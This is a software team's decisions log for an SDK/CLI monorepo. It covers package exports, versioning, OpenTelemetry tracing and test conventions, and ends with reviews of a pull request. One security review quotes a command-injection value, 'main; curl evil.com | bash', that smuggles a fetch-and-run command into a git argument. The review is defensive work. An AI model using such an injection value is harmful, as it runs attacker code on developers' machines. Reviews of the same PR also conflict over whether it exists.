- **Role:** Workspace orchestrator only (not publishable)
- **Preserved:** `package.json` (workspace def), tsconfig.json (base config), vitest.config.ts, test/, test-fixtures/, templates/, docs/, .squad/
- **Removed:** main, types, bin, runtime dependencies

**Key Call — SDK Barrel Cleanup:** Remove CLI utilities (`success`, `error`, `warn`, `fatal`, etc.) from SDK exports. CLI re-exports in `src/index.ts` were a mistake — those are CLI implementation details, not SDK API. This is a breaking change that's correct and intentional.

**Import Rewriting Rules:**
- CLI → SDK relative imports become package imports (`from '../config/'` → `from '@bradygaster/squad-sdk/config'`)
- Intra-SDK and intra-CLI imports stay relative (unchanged)

### 2026-02-22: CharterCompiler reuses parseCharterMarkdown — no duplicate parsing

**By:** Edie

**What:** `CharterCompiler.compile()` delegates to the existing `parseCharterMarkdown()` function from `charter-compiler.ts` rather than implementing its own markdown parser. The legacy class is a thin filesystem wrapper around the already-tested parsing logic.

**Why:** Single source of truth for charter parsing. The `parseCharterMarkdown` function already handles all `## Identity` and `## Model` field extraction with tested regex patterns. Duplicating that logic would create drift risk.

### 2026-02-22: AgentSessionManager uses optional EventBus injection

**By:** Edie

**What:** `AgentSessionManager` constructor accepts an optional `EventBus` parameter. When present, `spawn()` emits `session.created` and `destroy()` emits `session.destroyed`. When absent, the manager works silently (no events).

**Why:** Keeps the manager testable without requiring a full event bus setup. Coordinator can wire the bus when available; unit tests can omit it.

### 2026-02-22: Ink Shell Wiring — ShellApi callback pattern

**By:** Fenster

**Date:** 2026-02-22

**Status:** Implemented

**Context:** The shell needed to move from a readline echo loop to an Ink-based UI using the three existing components (AgentPanel, MessageStream, InputPrompt). The key challenge was connecting the StreamBridge (which pushes events from the streaming pipeline) into React component state.

**Decision:** **ShellApi callback pattern:** The `App` component accepts an `onReady` prop that fires once on mount, delivering a `ShellApi` object with three methods: `addMessage`, `setStreamingContent`, `refreshAgents`. The host (`runShell()`) captures this API and wires it to StreamBridge callbacks.

This keeps the Ink component decoupled from StreamBridge internals — the component doesn't import or know about the bridge. The host is the only place where both meet.

**`React.createElement` in index.ts:** Rather than renaming `index.ts` to `index.tsx` (which would ripple through exports maps and imports), `runShell()` uses `React.createElement(App, props)` directly. This keeps the file extension stable.

**Streaming content accumulation:** StreamBridge's `onContent` callback delivers deltas. The host maintains a `streamBuffers` Map to accumulate content per agent and pushes the full accumulated string to `setStreamingContent`. On `onComplete`, the buffer is cleared and the final message is added.

**Consequences:** StreamBridge is ready for coordinator wiring — call `_bridge.handleEvent(event)` when the coordinator emits streaming events. Direct agent messages and coordinator routing show placeholders until coordinator integration (Phase 3). All existing exports from `shell/index.ts` are preserved. New exports: `App`, `ShellApi`, `AppProps`.

### 2026-02-22: Runtime EventBus as canonical bus for orchestration classes

**By:** Fortier

**Date:** 2026-02-22

**Scope:** Coordinator, Ralph, and future orchestration components

**Decision:** The `runtime/event-bus.ts` (colon-notation: `session:created`, `subscribe()` API, built-in error isolation via `executeHandler()`) is the canonical EventBus for all orchestration classes. The `client/event-bus.ts` (dot-notation: `session.created`, `on()` API) remains for backward-compat but should not be used in new code.

**Rationale:**
- Runtime EventBus has proper error isolation — one handler failure doesn't crash others
- SquadCoordinator (M3-1) tests already use RuntimeEventBus
- Consistent API surface (`subscribe`/`subscribeAll`/`unsubscribe`) is cleaner than `on`/`onAny`
- Event type strings use colon-notation which avoids ambiguity with property access patterns

**Impact:**
- Coordinator and RalphMonitor now import from `../runtime/event-bus.js`
- All new EventBus consumers should follow this pattern
- Client EventBus remains exported for external consumers

### 2026-02-22: Runtime Module Test Patterns

**By:** Hockney (Tester)

**Date:** 2026-02-22

**Status:** Adopted

**Context:** Writing proactive tests for runtime modules (CharterCompiler, AgentSessionManager, Coordinator, RalphMonitor) being built in parallel by multiple team members.

**Decisions:**

1. **Two EventBus APIs require different mocks.** The client EventBus uses `on()`/`emit()` while the runtime EventBus uses `subscribe()`/`emit()`. Tests must use the correct mock depending on which bus the module under test consumes. AgentSessionManager uses the client bus (`on`); Coordinator uses the runtime bus (`subscribe`).

2. **CharterCompiler tests use real test-fixtures.** Instead of mocking the filesystem, we read from `test-fixtures/.squad/agents/` for `compile()` and `compileAll()` tests. This gives integration-level confidence. Only `parseCharterMarkdown` uses inline string fixtures for unit isolation.

3. **Coordinator routing priority is: direct > @mention > team keyword > default.** Tests explicitly verify this ordering. Any change to routing logic must preserve this priority chain.

4. **RalphMonitor tests are future-proof stubs.** Since Ralph is mostly TODO stubs, tests validate current behavior (empty arrays, no-throw lifecycle) and will automatically exercise real logic once implemented — no test changes needed.

**Impact:**
- 105 new tests across 4 files, all passing
- Test count: 1727 → 1832 across 61 files
- No circular dependencies verified (clean DAG)

**Migration Order:**
1. **Phase 1 (SDK first):** Copy 15 dirs + 4 files, update exports, build in isolation
2. **Phase 2 (CLI second):** Copy cli/ + cli-entry.ts, rewrite imports to SDK packages, build against SDK
3. **Phase 3 (root cleanup):** Delete root src/, update test imports, finalize structure

**Templates:** Copy into CLI package (Option A — self-contained packages).

**Why:** One-way dependency graphs enable independent package evolution. SDK stays pure library; CLI stays thin consumer. Future features only touch the relevant package.

### 2026-02-22: Version Alignment — 0.7.0 stubs → 0.8.0 real packages
**By:** Kobayashi (Git & Release)
**Status:** APPROVED & EXECUTED

**Context:**
- **0.7.0 npm stubs:** Placeholder packages published on npmjs.com (no real code)
- **Goal:** Publish real, working code under new version

**Decision: Bump to 0.8.0**
- **Rationale:** Clear break from stubs (0.7.0 is placeholder; 0.8.0 is functional code). Pre-1.0 signal appropriate for alpha software.

**Changes Executed:**
1. SDK `package.json`: version `0.7.0` → `0.8.0`
2. CLI `package.json`: version `0.7.0` → `0.8.0`, SDK dependency locked to `@bradygaster/squad-sdk@0.8.0`
3. SDK `src/index.ts`: `VERSION` export `0.7.0` → `0.8.0`
4. Root `package.json`: added `"private": true` (prevent accidental npm publish of workspace coordinator)

**Verification:** ✅ All version strings aligned, CLI dependency on SDK pinned, root marked private.

### 2026-02-22: Defer test import migration until root src/ removal
**By:** Hockney (Tester)
**Status:** Proposed

**Context:** After SDK/CLI workspace split, all 56 test files still import from root `../src/`. Build and all 1719 tests pass cleanly because root `src/` still exists.

**Decision:** Defer migrating test imports from `../src/` to `@bradygaster/squad-sdk` / `@bradygaster/squad-cli` until root `src/` is actually removed.

**Rationale:**
1. **Exports map gap:** SDK exposes 18 subpath exports; tests import ~40+ distinct deep internal paths not in exports map
2. **CLI no exports:** cli/shell/ tests have no package-level export path to migrate to
3. **Barrel divergence:** Root `src/index.ts` still exports CLI functions SDK package correctly does not
4. **Risk/reward:** 150+ import lines for zero functional benefit while root `src/` exists is pure risk

**When to revisit:** When root `src/` is deleted (blocker at that point). Options: expand exports maps, add vitest resolve.alias, or move tests into workspace packages.

### 2026-02-22: Build System Migration — tsconfig + package.json
**By:** Edie (TypeScript Engineer)
**Status:** Decision
**Scope:** Monorepo build configuration for SDK/CLI workspace packages

**What Changed:**
1. **Root tsconfig.json:** Base config only, shared compiler options, `files: []` (compiles nothing), project references to both packages
2. **SDK tsconfig.json:** Extends root, `composite: true`, declarations + maps, no JSX
3. **CLI tsconfig.json:** Extends root, `composite: true`, `jsx: "react-jsx"`, references SDK package
4. **Root package.json:** `private: true`, workspace orchestrator, stripped main/types/bin/runtime deps
5. **SDK package.json:** 18 subpath exports, `@github/copilot-sdk` as direct dependency
6. **CLI package.json:** `bin.squad` → `./dist/cli-entry.js`, ink/react runtime deps, templates in files array

**Why `composite: true`:** TypeScript project references require this. Without it, cross-package type information fails to resolve.

**Build Order:** `npm run build --workspaces` builds SDK first (no deps), then CLI (depends on SDK). npm respects topological order automatically.

**Verified:** Both packages compile with zero errors. All dist artifacts (`.js`, `.d.ts`, `.d.ts.map`) emitted correctly.

### 2026-02-22: Subpath exports in @bradygaster/squad-sdk
**By:** Edie (TypeScript Engineer)
**Issue:** #227

**What:** `packages/squad-sdk/package.json` declares 18 subpath exports (`.`, `./parsers`, `./types`, and 15 module paths). Each uses types-first condition ordering.

**Why:** Enables tree-shaking and focused imports. Consumers can `import { … } from '@bradygaster/squad-sdk/config'` instead of pulling the entire barrel. Type-only consumers can import from `./types` with zero runtime cost.

**Constraints:**
- Every subpath must have a corresponding source barrel (`src/<path>.ts` or `src/<path>/index.ts`)
- `"types"` condition must appear before `"import"` — Node.js evaluates top-to-bottom
- ESM-only: no `"require"` condition per team decision
- Adding a new subpath requires both source barrel and exports entry; removing one without the other breaks resolution

### 2026-02-22: Barrel file conventions for parsers and types
**By:** Kujan (SDK Expert)
**Issues:** #225, #226 (Epic #181)

**What:**
- `src/parsers.ts` re-exports all parser functions AND their types using `export { ... } from` and `export type { ... } from`
- `src/types.ts` re-exports ONLY types using `export type { ... } from` exclusively — guaranteed zero runtime imports
- Both follow the existing ESM barrel pattern from `src/index.ts`

**Why:**
1. **Consumer convenience:** SquadUI and others can import parsers or types from a single module instead of reaching into internal paths
2. **Separation of concerns:** `types.ts` is safe for type-only contexts (declaration files). `parsers.ts` includes runtime functions for consumers that need them
3. **No existing modifications:** Both are additive-only new files — zero risk to existing behavior

**Impact:** Low. Two new files, no changes to existing source. Build passes, all 1683 tests pass.

### 2026-02-22: Use npm-native workspace resolution (not pnpm `workspace:*`)
**By:** Edie (TypeScript Engineer)
**Date:** 2026-02-22
**Status:** Applied

**Context:** Brady's task requested using `workspace:*` for the CLI→SDK dependency. However, this project uses npm workspaces (not pnpm or Yarn). The `workspace:` protocol is a pnpm/Yarn feature and npm rejects it with `EUNSUPPORTEDPROTOCOL`.

**Decision:** Use `"*"` as the version specifier instead. Under npm workspaces, when a dependency name matches a local workspace package, npm automatically resolves to the local package regardless of the version specifier. `"*"` accepts any version, ensuring the local SDK is always used during development.

**Trade-off:** `"*"` will be published as-is to npm (unlike pnpm's `workspace:*` which gets replaced with the real version at publish time). Before publishing the CLI package, the SDK dependency version should be pinned to the actual release version. A `prepublishOnly` script or CI step could automate this.

### 2026-02-22: Test import migration to workspace packages
**By:** Fenster (Core Dev)
**Date:** 2026-02-22
**Status:** Implemented

**Context:** All 56 test files imported from root `src/` via relative paths (`../src/...`). With the SDK/CLI workspace split, tests needed to import from `@bradygaster/squad-sdk` and `@bradygaster/squad-cli` packages instead.

**Decision:**
1. **Barrel-first imports:** Where a barrel/index file re-exports symbols from sub-modules, tests import from the barrel path (e.g., `@bradygaster/squad-sdk/config` instead of individual files).
2. **New subpath exports for orphaned modules:** 8 runtime/adapter modules not covered by existing barrels got new subpath exports in the SDK package.json.
3. **Missing barrel re-exports fixed:** `selectResponseTier`/`getTier` added to coordinator barrel; `onboardAgent`/`addAgentToConfig` added to agents barrel.
4. **CLI functions correctly located:** Consumer imports test updated to import CLI functions from `@bradygaster/squad-cli` (not SDK), reflecting intentional separation.

**Consequence:** Zero `grep -r "from '../src/" test/` results. All 1727 tests pass. SDK has 26 subpath exports, CLI has 17.

### 2026-02-22: CI/CD & Release Readiness Assessment
**By:** Kobayashi (Git & Release)
**Date:** 2026-02-22
**Status:** ASSESSMENT COMPLETE

**Summary:** All 13 CI/CD workflows are production-ready and correctly configured. Merge drivers are in place. Branch protection is working. Publishing infrastructure works both for stable releases (v* tags) and pre-releases (insider branch).

**Version Status:**
- SDK `package.json`: 0.8.0
- CLI `package.json`: 0.8.1 (intentional patch for bin entry fix)
- CHANGELOG: 0.6.0-alpha.0 (root workspace marker)

**Workflow Audit:**
- ✅ Core CI validates on PR/push to main, dev, insider
- ✅ squad-publish.yml: Publishes both packages on v* tags with public access
- ✅ squad-insider-publish.yml: Auto-publishes on insider push with `--tag insider`
- ✅ Release/promote workflows fully functional

**Merge Drivers:** Union merge configured for append-only files (decisions.md, agents/*/history.md, log/**, orchestration-log/**).

**Release Readiness:** Insider channel ready now. Stable release ready after version alignment if desired.

**Recommendation:** Version alignment (SDK 0.8.0, CLI 0.8.0) simplifies CHANGELOG during pre-1.0. Separate versioning can be deferred post-1.0 if needed.

### 2026-02-22: Fix npx bin resolution for squad-cli
**By:** Rabin (Distribution)
**Date:** 2026-02-22
**Status:** Implemented & Published

**Context:** `npx @bradygaster/squad-cli@0.8.0` printed placeholder text instead of running the real CLI. The bin entry was `"squad": "./dist/cli-entry.js"` but npx resolves by unscoped package name (`squad-cli`), not by custom bin names.

**Decision:**
1. Added `"squad-cli"` as second bin entry pointing to `./dist/cli-entry.js`
2. Replaced orphaned placeholder `dist/cli.js` with redirect to `cli-entry.js`
3. Bumped version to 0.8.1 (0.8.0 immutable on npm)
4. Published @bradygaster/squad-cli@0.8.1 to npm

**Consequence:**
- `npx @bradygaster/squad-cli` now runs the real CLI
- `squad` command still works for global installs
- Both bin names resolve to the same entry point
- Future releases must keep both bin entries




### OpenTelemetry version alignment: pin core packages to 1.30.x line
**By:** Edie
**Issue:** #254
**What:** All OTel optional dependencies in `packages/squad-sdk/package.json` must stay version-aligned: `sdk-node@^0.57.x` requires `sdk-trace-base@^1.30.0`, `sdk-trace-node@^1.30.0`, `sdk-metrics@^1.30.0`, `resources@^1.30.0`. These must be explicit optional dependencies, not left to transitive resolution.
**Why:** Without explicit pins, npm hoists the latest versions (2.x) of `sdk-trace-base`, `sdk-metrics`, and `resources` to the top-level `node_modules`. The 2.x types are structurally incompatible with the 1.x types that `sdk-node@0.57.x` transitively depends on, causing TS2345/TS2741 type errors (e.g., missing `instrumentationScope` on `ReadableSpan`, missing `getRawAttributes` on `Resource`). Explicit pins at `^1.30.0` force npm to deduplicate on the 1.x line, eliminating the type conflicts.


# Decision: OpenTelemetry Tracing for Agent Lifecycle & Coordinator Routing

**Date:** 2026-02-22  
**By:** Fenster  
**Issues:** #257, #258  
**Status:** Implemented

## What

Added OpenTelemetry trace instrumentation to four files in `packages/squad-sdk/src/`:

1. **`agents/index.ts`** — AgentSessionManager: `spawn()`, `resume()`, `destroy()` wrapped with spans (`squad.agent.spawn`, `squad.agent.resume`, `squad.agent.destroy`).
2. **`agents/lifecycle.ts`** — AgentLifecycleManager: `spawnAgent()`, `destroyAgent()` wrapped with spans (`squad.lifecycle.spawnAgent`, `squad.lifecycle.destroyAgent`).
3. **`coordinator/index.ts`** — Coordinator: `initialize()`, `route()`, `execute()`, `shutdown()` wrapped with spans (`squad.coordinator.initialize`, `squad.coordinator.route`, `squad.coordinator.execute`, `squad.coordinator.shutdown`).
4. **`coordinator/coordinator.ts`** — SquadCoordinator: `handleMessage()` wrapped with span (`squad.coordinator.handleMessage`).

## Why

- Observability is foundational for debugging multi-agent orchestration at runtime.
- Using `@opentelemetry/api` only — no-ops without a registered provider, so zero cost in production unless OTel is configured.
- Trace hierarchy: `coordinator.handleMessage → coordinator.route → coordinator.execute → lifecycle.spawnAgent → agent.spawn`.

## Convention Established

- **Tracer name:** `trace.getTracer('squad-sdk')` — one tracer per package.
- **Span naming:** `squad.{module}.{method}` (e.g., `squad.agent.spawn`).
- **Attributes:** Use descriptive keys like `agent.name`, `routing.tier`, `target.agents`, `spawn.mode`.
- **Error handling:** `span.setStatus({ code: SpanStatusCode.ERROR })` + `span.recordException(err)` in catch blocks. Always `span.end()` in `finally`.
- **Import only from `@opentelemetry/api`** — never from SDK packages directly.


# Decision: OTel Foundation — NodeSDK over individual providers

**Author:** Fortier (Node.js Runtime)
**Date:** 2026-02-22
**Issues:** #255, #256
**Status:** Implemented

## Context

Issues #255 and #256 require OTel provider initialization and a bridge from the existing TelemetryCollector to OTel spans. The OpenTelemetry JS ecosystem has multiple packages (`sdk-trace-base`, `sdk-trace-node`, `sdk-metrics`, `resources`, `exporter-*`) that frequently ship with incompatible transitive versions, causing TypeScript type errors even when runtime behavior is correct.

## Decision

Use `@opentelemetry/sdk-node`'s `NodeSDK` class as the single provider manager, and import `Resource` and `PeriodicExportingMetricReader` from its re-exports (`resources`, `metrics` sub-modules) rather than installing them as direct dependencies.

Direct deps added to `packages/squad-sdk`:
- `@opentelemetry/api`
- `@opentelemetry/sdk-node`
- `@opentelemetry/exporter-trace-otlp-http`
- `@opentelemetry/exporter-metrics-otlp-http`
- `@opentelemetry/semantic-conventions`

NOT added (bundled via `sdk-node`):
- `@opentelemetry/sdk-trace-base`
- `@opentelemetry/sdk-trace-node`
- `@opentelemetry/sdk-metrics`
- `@opentelemetry/resources`

## Consequences

- Single `_sdk.shutdown()` handles both tracing and metrics cleanup.
- No version skew between trace and metric providers.
- `getTracer()` / `getMeter()` return no-op instances when OTel is not initialized — zero overhead in the default case.
- The bridge (`otel-bridge.ts`) is additive — it produces a `TelemetryTransport` that can be registered alongside any existing transport.

## Files Changed

- `packages/squad-sdk/src/runtime/otel.ts` — Provider initialization module
- `packages/squad-sdk/src/runtime/otel-bridge.ts` — TelemetryCollector → OTel span bridge
- `packages/squad-sdk/src/index.ts` — Barrel exports for both modules
- `packages/squad-sdk/package.json` — Dependencies + subpath exports



### Decision: StreamingPipeline.markMessageStart() as explicit latency tracking entry point

**By:** Fortier (Node.js Runtime)
**Date:** 2026-02-22
**Issues:** #259, #264

**What:** Latency metrics (TTFT, response duration, tokens/sec) in StreamingPipeline require an explicit `markMessageStart(sessionId)` call before sending a message. This opts callers into latency tracking rather than making it automatic.

**Why:** The pipeline doesn't own the send call — it only sees events after they arrive. Without a start timestamp, TTFT and duration are meaningless. Making it explicit avoids hidden coupling between the pipeline and SquadClient.sendMessage(), and means callers who don't need latency metrics (e.g. tests, offline replay) pay zero overhead.

**Pattern:** Call `pipeline.markMessageStart(sessionId)` → send message → pipeline records TTFT on first `message_delta` with `index === 0`, records duration + tokens/sec when `usage` event arrives. Tracking state auto-cleans after usage event or `clear()`.

**Also:** SquadClient now exposes `sendMessage(session, options)` with `squad.session.message` + child `squad.session.stream` OTel spans, and `closeSession(sessionId)` as a traced alias for `deleteSession`.


### 2026-02-22: Tool trace enhancements + agent metric wiring conventions

**By:** Fenster
**What:** Established patterns for OTel tool span attributes and agent metric wiring:

1. **`sanitizeArgs()`** strips fields matching `/token|secret|password|key|auth/i` before recording as span attributes. Truncates to 1024 chars. Exported from `tools/index.ts` for reuse.
2. **`defineTool` accepts optional `agentName`** in config — recorded as `agent.name` span attribute when present. Does not change the handler signature.
3. **`result.length`** attribute added to `squad.tool.result` events — measures `textResultForLlm` length.
4. **Agent metrics** (`recordAgentSpawn/Duration/Error/Destroy`) wired into both `AgentSessionManager` (index.ts) and `AgentLifecycleManager` (lifecycle.ts). Duration computed from `createdAt` in destroy path.
5. **Parent span propagation** deferred (TODO comment in `defineTool`) — will wire when agent.work span lifecycle is complete.

**Why:** Consistent instrumentation patterns prevent divergence between tool and agent telemetry. The sanitization approach is deliberately simple (field-name matching, not value inspection) to keep it fast and predictable. Agent metrics are wired at both abstraction levels (SessionManager + LifecycleManager) because they can be used independently.

**References:** Issues #260, #262


# Decision: OTel Metric Wiring Pattern (#261, #263)

**Author:** Edie  
**Date:** 2026-02-22  
**Status:** Implemented  

## Context

Issues #261 and #263 required wiring pre-existing metric functions from `otel-metrics.ts` into the runtime (`StreamingPipeline`) and adapter (`SquadClient`).

## Decision

- **Token usage metrics** (`recordTokenUsage`) are recorded in `StreamingPipeline.processEvent()` AFTER dispatching to user-registered handlers. This ensures user handlers see the event before OTel instrumentation, and handler failures don't block metric recording.
- **Session pool metrics** are recorded at the innermost success/error boundary in `SquadClient`:
  - `recordSessionCreated()` after successful `client.createSession()` return
  - `recordSessionClosed()` after successful `client.deleteSession()` return
  - `recordSessionError()` at the top of inner catch blocks — recorded for EVERY failed attempt, including ones that trigger reconnection. This is intentional: a reconnect-eligible failure is still an error worth counting.
- No new exports needed — barrel and subpath exports were already wired in the Phase 1 otel-metrics scaffold.

## Rationale

Metric calls are no-ops when OTel is not configured (the meter returns no-op instruments), so this adds zero overhead for users without OTel. Recording errors before reconnect checks gives accurate failure counts without double-counting successes (the recursive retry gets its own `recordSessionCreated()` on success).


# Decision: OTel metrics test pattern — spy meter mock

**By:** Hockney (Tester)
**Date:** 2026-02-23
**Status:** Implemented

## What
OTel metrics tests use a spy-meter pattern: mock `getMeter()` to return a fake meter where every `createCounter`/`createHistogram`/`createUpDownCounter`/`createGauge` returns a spy instrument with `.add()` and `.record()` mocks. This allows verifying exact metric names, values, and attributes without a real OTel SDK or collector.

## Why
- The otel-metrics module is a thin instrumentation layer — tests need to verify *what* gets recorded, not *how* OTel processes it.
- Spy meter pattern avoids needing `InMemoryMetricExporter` (which has complex async flush semantics) and keeps tests synchronous and fast.
- Pattern is consistent with existing otel-bridge tests (spy spans via InMemorySpanExporter) but adapted for the metrics API surface.

## Applies to
- `test/otel-metrics.test.ts` (34 tests)
- `test/otel-metric-wiring.test.ts` (5 tests)
- Future OTel metric tests should follow this same pattern.

---

## 2026-02-22: Security Review: PR #300 — Upstream Inheritance

**By:** Baer (Security)
**Status:** 🛑 BLOCK — Critical finding must be resolved before merge

PR #300 introduces a significant trust boundary expansion. The feature design is sound, but the implementation has a **critical command injection vulnerability** and several high/medium issues that must be addressed.

### Finding 1: Command Injection via execSync — CRITICAL

**File:** `packages/squad-cli/src/cli/commands/upstream.ts`
**Lines:** ~122, ~186, ~189

The `ref` value from upstream.json is interpolated **unquoted** into shell commands:
```typescript
execSync(`git clone --depth 1 --branch ${ref} --single-branch "${source}" "${cloneDir}"`, ...)
```

A malicious upstream.json entry with `ref: "main; curl evil.com | bash"` executes arbitrary commands. The `source` value is in double quotes but shell double-quotes still allow `$(command)` substitution.

**Fix required:** Use `execFileSync('git', ['clone', '--depth', '1', '--branch', ref, ...])` instead of `execSync` with string interpolation. `execFileSync` bypasses the shell entirely, eliminating injection.

### Finding 2: Arbitrary Filesystem Read — HIGH

**File:** `packages/squad-sdk/src/upstream/resolver.ts`

For `type: 'local'`, the resolver reads from any filesystem path specified in `upstream.json` with zero validation. For `type: 'export'`, it reads and parses any JSON file at any path. Anyone with write access to `upstream.json` can cause the system to read from any local path on the developer's machine.

**Fix required:** Validate that local sources are absolute paths to directories that actually contain `.squad/` or `.ai-team/`. Consider requiring sources to be within a configurable allowlist or requiring explicit user confirmation on first use.

### Finding 3: Symlink Following — MEDIUM

**File:** `packages/squad-sdk/src/upstream/resolver.ts`

`fs.readFileSync` follows symlinks. A local upstream's `.squad/skills/evil/SKILL.md` could be a symlink to `/etc/passwd` or `~/.ssh/id_rsa`. The content would be read into memory and potentially injected into agent prompts.

**Fix recommended:** Use `fs.lstatSync` to check for symlinks before reading, or use `fs.realpathSync` and verify the resolved path stays within the upstream's root directory.

### Finding 4: No User Consent Model — MEDIUM

**Files:** `resolver.ts`, `upstream.ts`

There is no mechanism for a developer to review or approve what upstream sources will be read at session start. If upstream.json is committed to a repo and a developer clones it, the system silently reads from whatever paths are configured.

**Fix recommended:** On first session with a new upstream.json, display the configured sources and require explicit acknowledgment. Store consent in a local (gitignored) file.

### Findings 5-8

Findings 5 (Prompt Injection) — Medium, Finding 6 (Size Limits) — Low, Finding 7 (Git Credential) — Low, Finding 8 (JSON Prototype Pollution) — No Action.

### Required Actions Before Merge

1. **[CRITICAL]** Replace all `execSync` shell string interpolation with `execFileSync` array-based invocation
2. **[HIGH]** Add input validation for `ref` and `source`
3. **[MEDIUM]** Add symlink detection in resolver reads
4. **[MEDIUM]** Add security tests for injection, traversal, and symlink scenarios

**Verdict:** This PR must not merge until findings 1-4 are addressed. The command injection via execSync is CWE-78 (OS Command Injection) and is trivially exploitable by anyone who can edit upstream.json.

---

## 2026-02-22: Code Quality Review: PR #300 — Upstream Inheritance

**By:** Fenster (Core Dev)
**Status:** ⚠️ APPROVE WITH REQUIRED FIXES — 5 items before merge

Clean architecture, correct SDK/CLI separation, good test coverage. Five items must be fixed before merge.

### Finding 1: Wrong `fatal` function — BUG

**File:** `packages/squad-cli/src/cli/commands/upstream.ts:44`

The command imports `import { error as fatal }` from output.js, but all other CLI commands use `import { fatal } from ../core/errors.js` which throws SquadError. After a "fatal" error, execution continues to the next `if (action === ...)` block instead of stopping.

**Fix required:** Change import to `import { fatal } from '../core/errors.js';` and remove redundant `return;` statements after `fatal()` calls (since `fatal` returns `never`, TypeScript will enforce unreachable code).

### Finding 2: Command not registered in CLI router — MISSING

**File:** `packages/squad-cli/src/cli-entry.ts`

The `upstream` command is not wired into the CLI entry point. Users cannot invoke `squad upstream` — it's dead code. Every other command follows this pattern in cli-entry.ts.

**Fix required:** Add the route to `cli-entry.ts`.

### Finding 3: `execSync` command injection — CRITICAL (confirms Baer)

**File:** `packages/squad-cli/src/cli/commands/upstream.ts:148, 238, 242`

Baer already flagged this. Confirmed: the `ref` value is interpolated unquoted into shell command strings. Must use `execFileSync('git', [...args])` with array-based invocation.

### Finding 4: Test imports use relative source paths — CONVENTION VIOLATION

**Files:** `test/upstream.test.ts:11`, `test/upstream-e2e.test.ts:10-11`

Tests import from `../packages/squad-sdk/src/upstream/resolver.js` instead of `@bradygaster/squad-sdk/upstream`. This violates the test import migration decision (all 56 test files were migrated to package imports).

**Fix required:** Change to `import { resolveUpstreams, buildInheritedContextBlock, buildSessionDisplay } from '@bradygaster/squad-sdk/upstream';`

### Finding 5: `as any` cast in test — MINOR

**File:** `test/upstream-e2e.test.ts:861`

Uses `(org.castingPolicy as any).universe_allowlist`. Should use `as Record<string, unknown>` per strict-mode conventions.

### What's Good

- SDK/CLI separation is correct. Types and resolver in SDK, CLI command in CLI package.
- SDK barrel export follows existing pattern with `./upstream` subpath entry.
- `readUpstreamConfig` returns null (not throws), consistent with `readOptionalFile`/`readOptionalJson`.
- Type definitions are clean: `UpstreamType`, `UpstreamSource`, `UpstreamConfig`, `ResolvedUpstream`.
- Path handling uses `path.join`/`path.resolve` correctly.
- Test coverage is thorough: 14 unit tests + E2E hierarchy test.

### Required Actions (5)

1. **[BUG]** Fix `fatal` import from `errors.ts`, remove redundant `return` statements
2. **[MISSING]** Register `upstream` command in `cli-entry.ts`
3. **[CRITICAL]** Replace `execSync` with `execFileSync` array args
4. **[CONVENTION]** Fix test imports to use `@bradygaster/squad-sdk/upstream` package paths
5. **[MINOR]** Replace `as any` with `as Record<string, unknown>` in test

---

## 2026-02-22: Test Coverage Requirements: PR #300 Upstream Inheritance

**By:** Hockney (Tester)
**Status:** BLOCKED — Cannot review what doesn't exist

**Finding:** PR #300 does not exist. No pull request, branch, source files, or test files were found in the repository. All referenced artifacts are missing:
- `packages/squad-sdk/src/upstream/resolver.ts` — not found
- `packages/squad-cli/src/cli/commands/upstream.ts` — not found
- `test/upstream.test.ts`, `test/upstream-e2e.test.ts` — not found

**Test Coverage Requirements (for when PR materializes):**

### Unit Tests (resolver.ts — all 8 functions)
1. **readUpstreamConfig()** — happy path, null, malformed JSON, empty upstreams, missing fields
2. **findSquadDir()** — test `.squad/` primary and `.ai-team/` fallback
3. **readSkills()** — empty directory, no SKILL.md files, permission errors, valid skills
4. **resolveFromExport()** — valid export, invalid/corrupt export, missing file
5. **resolveUpstreams()** — all source types (local, git, export), mixed sources, one failure doesn't block others
6. **buildInheritedContextBlock()** — empty, single, multiple upstreams, deduplication
7. **buildSessionDisplay()** — empty, single, multiple upstreams

### CLI Command Tests (upstream.ts — 228 lines)
8. **squad upstream add** — valid local path, valid git URL, invalid path, duplicate add
9. **squad upstream remove** — existing entry, non-existent entry
10. **squad upstream list** — empty list, populated list, formatting
11. **squad upstream sync** — fresh sync, incremental sync, unreachable upstream

### Edge Cases (critical)
12. **Circular references** — repo A → B → A must not infinite loop
13. **Deep nesting** — 4+ level hierarchy must resolve transitively
14. **`.ai-team/` fallback** — legacy dir name must resolve
15. **Unicode/special chars in paths**
16. **Empty upstream.json** — valid JSON should not error
17. **Malformed entries** — missing required fields

### E2E Tests
18. **Transitive inheritance proof** — 3-level test asserts level-3 inherits from level-1
19. **Temp dir cleanup** — use pattern from resolution.test.ts

### Minimum Counts
- Unit tests: ≥20
- E2E tests: ≥5
- CLI tests: ≥12 (currently 0 — this is a blocking gap)

**Verdict:** BLOCKED. When the PR appears, apply these requirements as the acceptance gate.

---

## 2026-02-22: Architecture Review: PR #300 — Upstream Inheritance

**By:** Keaton (Lead)
**Status:** REQUEST CHANGES

The upstream inheritance concept is **architecturally sound** — the Org → Team → Repo hierarchy is a real need, the module boundaries are correct (SDK types + resolver, CLI commands), and `.squad/upstream.json` is the right config location. But several issues must be resolved before this merges.

### Required Changes (blocking)

#### 1. Proposal-first workflow violation

Team decision: "Meaningful changes require a proposal in `docs/proposals/` before execution." This is a +1056 line PR adding a new top-level SDK module. No proposal exists. Write the proposal — even retroactively. It forces articulation of scope boundaries, especially how upstream interacts with the coordinator and the existing sharing/export system.

#### 2. Type safety — `castingPolicy: Record<string, unknown>` is unacceptable

Team decision (Edie): strict mode, no loose types. The casting module exports `CastingConfig`, `CastingEntry`, and `CastingUniverse` — real types with real contracts. Using `Record<string, unknown>` for `castingPolicy` in `ResolvedUpstream` breaks the type chain. Import and use the actual casting types.

#### 3. Missing sanitization on inherited content

The existing `sharing/export.ts` sanitizes all outgoing content against `SECRET_PATTERNS`. The upstream resolver reads skills, decisions, wisdom, casting policy, and routing from external repos and injects them into the runtime context. There is no sanitization pass. An upstream repo that accidentally contains a leaked secret would propagate it into every downstream repo's session context. Add sanitization — reuse the existing `SECRET_PATTERNS` from the sharing module.

#### 4. `findSquadDir()` checking `.ai-team/` — resolve the ambiguity

The resolver checks both `.squad/` and `.ai-team/` as valid upstream directories. This creates permanent dual-format support without a documented deprecation path. Either: (a) document that `.ai-team/` is legacy and will be removed with a console warning, or (b) make the fallback order explicit and tested. Don't silently support two directory names forever.

### Strongly Recommended (non-blocking but expected before v1)

#### 5. Coordinator integration path

